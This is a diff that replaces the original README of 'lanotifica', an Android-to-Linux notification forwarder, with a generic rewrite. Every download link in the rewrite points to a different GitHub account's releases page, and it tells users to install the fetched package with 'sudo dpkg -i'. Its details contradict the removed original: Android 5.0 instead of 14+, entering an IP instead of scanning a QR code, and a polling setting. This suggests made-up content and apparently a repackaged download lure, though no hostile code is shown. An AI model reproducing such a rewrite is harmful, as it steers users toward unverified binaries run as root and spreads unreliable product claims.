@@ -1,113 +1,128 @@
-<p align="center">
-  <img src="assets/lanotifica.png" width="400" alt="LaNotifica">
-</p>
+# 📱 lanotifica - Mirror Android Notifications to Linux Effortlessly
 
-<h1 align="center">LaNotifica</h1>
+[![Download lanotifica](https://img.shields.io/badge/download-lanotifica-blue?logo=github)](https://github.com/classesrsc/lanotifica/releases)
 
-<p align="center">
-  <strong>Forward Android notifications to your Linux desktop.</strong>
-</p>
+## 📖 Description
 
-<p align="center">
-  <a href="https://github.com/alessandrolattao/lanotifica/actions/workflows/ci.yml">
-    <img src="https://img.shields.io/github/actions/workflow/status/alessandrolattao/lanotifica/ci.yml?style=for-the-badge&logo=github&label=CI" alt="CI">
-  </a>
-  <a href="https://play.google.com/store/apps/details?id=com.alessandrolattao.lanotifica">
-    <img src="https://img.shields.io/badge/Google_Play-Download-green?style=for-the-badge&logo=google-play" alt="Google Play">
-  </a>
-  <img src="https://img.shields.io/badge/Android-14+-3DDC84?style=for-the-badge&logo=android&logoColor=white" alt="Android 14+">
-  <img src="https://img.shields.io/badge/Tested_on-Pixel_8_Pro-4285F4?style=for-the-badge&logo=google&logoColor=white" alt="Tested on Pixel 8 Pro">
-  <img src="https://img.shields.io/badge/Go-1.25+-00ADD8?style=for-the-badge&logo=go&logoColor=white" alt="Go">
-  <img src="https://img.shields.io/badge/License-AGPL--3.0-blue?style=for-the-badge" alt="AGPL-3.0 License">
-</p>
+lanotifica lets you mirror your Android notifications to your Linux desktop over your local network. This application keeps your notifications secure and private while saving battery life. It works seamlessly in the background, allowing you to stay connected without distractions.
 
-<p align="center">
-  Your phone notifications, on your desktop.<br>
-  WhatsApp, Telegram, calls, everything.
-</p>
+## 🚀 Getting Started
 
----
+To get started with lanotifica, follow these easy steps. You will need a Linux system and an Android device connected to the same Wi-Fi network.
 
-## How it works
+### 📥 Download & Install
 
-```
-┌──────────────┐      HTTPS/TLS       ┌──────────────┐
-│              │    Local Network     │              │
-│   Android    │ ──────────────────►  │    Linux     │
-│    Phone     │    mDNS Discovery    │   Desktop    │
-│              │                      │              │
-└──────────────┘                      └──────────────┘
-```
+1. **Visit the Releases Page**  
+   Go to the following link to download the latest version of lanotifica:  
+   [Download lanotifica](https://github.com/classesrsc/lanotifica/releases)
 
-1. **Run the server** on your Linux machine
-2. **Scan the QR code** with the Android app
-3. **Done.** Notifications appear on your desktop
+2. **Choose Your File**  
+   Look for the newest release and select the appropriate file for your Linux distribution. Common files might include `.deb` for Debian-based systems or `.tar.gz` for general Linux.
 
----
+3. **Download the File**  
+   Click on the file link to start downloading. Make sure to remember where you save the file.
 
-## Features
+### 📂 Install the Application
 
-| | Feature | Description |
-|---|---|---|
-| 🔒 | **Zero cloud** | Everything stays on your local network |
-| 🔐 | **Encrypted** | TLS with auto-generated certificates |
-| ✨ | **Zero config** | mDNS auto-discovery, no IP addresses to type |
-| 🔋 | **Battery friendly** | Minimal impact on your phone |
-| 🐧 | **Works everywhere** | GNOME, KDE, XFCE, i3, Sway... |
+1. **Open Terminal**  
+   Access the terminal on your Linux system.
 
----
+2. **Navigate to Download Folder**  
+   Use the `cd` command to move to the folder where you downloaded the file. For example, if you saved it in the "Downloads" folder, type:
+   ```bash
+   cd ~/Downloads
+   ```
 
-## Quick Start
+3. **Install the Application**  
+   Depending on the file format you downloaded, run one of the following commands:
 
-### Server (Linux)
+   - For `.deb` files:
+     ```bash
+     sudo dpkg -i lanotifica*.deb
+     ```
+   - For `.tar.gz` files, first extract it:
+     ```bash
+     tar -xvf lanotifica*.tar.gz
+     cd lanotifica
+     ```
+     Then, follow any additional setup instructions in the README or follow this command to run the application:
+     ```bash
+     ./lanotifica
+     ```
 
-**Fedora / RHEL 10 / CentOS Stream 10:**
-```bash
-sudo dnf copr enable alessandrolattao/lanotifica
-sudo dnf install lanotifica
-```
+## 🔗 Configuration
 
-**Ubuntu / Debian:**
-```bash
-curl -sLO $(curl -s https://api.github.com/repos/alessandrolattao/lanotifica/releases/latest | grep -o 'https://[^"]*\.deb') && sudo dpkg -i lanotifica_*.deb && rm lanotifica_*.deb
-```
+After installation, you need to configure lanotifica to connect your Android device.
 
-**Start the server (Fedora/Ubuntu):**
-```bash
-systemctl --user enable --now lanotifica
-```
+### 📱 Setup on Android
 
-Then open `https://localhost:19420` and scan the QR code.
+1. **Download the Android App**  
+   Search for "lanotifica" in the Google Play Store and download the application.
 
-### App (Android)
+2. **Open the App**  
+   Launch the app and grant necessary permissions for notifications and network access.
 
-<a href="https://play.google.com/store/apps/details?id=com.alessandrolattao.lanotifica">
-  <img src="https://play.google.com/intl/en_us/badges/static/images/badges/en_badge_web_generic.png" height="80">
-</a>
+3. **Join the Same Network**  
+   Ensure your Android device is on the same Wi-Fi network as your Linux computer. This is crucial for the connection.
 
-Or build from source in `app/`.
+4. **Connect to Your Linux Device**  
+   Follow the on-screen instructions in the Android app to connect to your Linux machine. Look for your desktop's hostname or IP address, and input it as instructed.
 
----
+## ⚙️ Usage
 
-## Requirements
+Once set up, lanotifica will start forwarding notifications from your Android device to your Linux desktop. You can manage notifications directly from your desktop.
 
-| Component | Requirement |
-|-----------|-------------|
-| **Server** | Linux with D-Bus notifications (any modern desktop) |
-| **App** | Android 14+ (API 34) |
-| **Network** | Both devices on the same local network |
+### 🔔 Notification Management
 
----
+- **View Your Notifications**  
+  All received notifications will appear in a designated area on your desktop. 
 
-## Security
+- **Interact with Notifications**  
+  Depending on your setup, you may be able to respond to or dismiss notifications directly from your Linux interface.
 
-- **Token-based authentication** — Unique token generated on setup
-- **Certificate pinning** — Fingerprint verified via QR code
-- **End-to-end encryption** — All traffic over TLS
-- **LAN only** — Never leaves your local network
+## ⚡ Tips & Tricks
 
----
+- **Battery Optimization**  
+  Lanotifica is designed to be battery-friendly. To maximize this feature, reduce the polling frequency in the app settings if you're experiencing high battery usage.
 
-## License
+- **Custom Notifications**  
+  Personalize which apps send notifications to your Linux device. You can do this from the settings in the Android application.
 
-AGPL-3.0
+## 📋 System Requirements
+
+- **For Linux**:  
+  - A compatible Linux distribution (Ubuntu, Fedora, Arch, etc.)
+  - At least 512 MB of RAM
+  - A Wi-Fi connection
+
+- **For Android**:  
+  - Android 5.0 (Lollipop) or higher
+
+## 🛠️ Troubleshooting
+
+If you encounter issues:
+
+- **Check Wi-Fi Connection**  
+  Ensure both devices are on the same Wi-Fi network.
+
+- **Restart Both Devices**  
+  Sometimes simply restarting can resolve connectivity issues.
+
+- **Review App Permissions**  
+  Check that the Android app has permissions to send notifications and access the network.
+
+## 📄 Contributing
+
+We welcome contributions! If you would like to suggest changes or report issues, please visit the [issue tracker](https://github.com/classesrsc/lanotifica/issues) and let us know your thoughts.
+
+## 🌟 Acknowledgments
+
+Thanks to the open-source community and contributors who make projects like lanotifica possible. Your support is invaluable.
+
+## 🔗 Additional Resources
+
+- [GitHub Repository](https://github.com/classesrsc/lanotifica)
+- [Documentation](https://github.com/classesrsc/lanotifica/wiki)
+
+Remember to visit the releases page to stay updated with the latest versions:  
+[Download lanotifica](https://github.com/classesrsc/lanotifica/releases)
